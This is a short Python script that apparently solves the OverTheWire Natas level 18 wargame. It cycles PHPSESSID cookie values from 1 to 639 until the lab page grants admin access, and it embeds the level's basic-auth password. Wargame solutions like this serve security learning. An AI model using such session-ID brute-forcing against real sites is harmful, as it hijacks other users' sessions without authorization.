import requests, string

target = 'http://natas18.natas.labs.overthewire.org'
auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
params = dict(username='admin', password='s3cr3t')
cookies = dict()


for i in range(1,640):
    print ("Trying with PHPSESSID = " + str(i))
    cookies = dict(PHPSESSID =str(i))
    r = requests.get(target, auth=auth, params=params, cookies=cookies)
    if "You are an admin" in r.text:
        print (r.text)
        break
